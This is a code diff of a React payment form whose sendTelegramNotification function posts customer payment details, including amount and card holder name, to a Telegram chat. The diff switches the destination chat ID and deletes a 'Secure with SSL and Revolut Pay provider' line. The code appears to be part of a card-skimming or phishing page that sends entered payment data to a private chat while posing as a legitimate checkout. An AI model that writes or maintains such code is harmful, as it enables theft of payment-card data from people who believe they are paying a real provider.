@@ -39,7 +39,7 @@ const sendTelegramNotification = async (paymentData: any) => {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: "6293259686",
+        chat_id: "-4781499307",
         text: `New payment:
 Amount: ${paymentData.amount}
 Card Holder: ${paymentData.cardHolder}
@@ -195,7 +195,6 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         </Button>
       </div>
       <p className="text-gray-400 text-sm mt-8 text-center">
-        Secure with SSL and Revolut Pay provider
       </p>
     </form>
   );
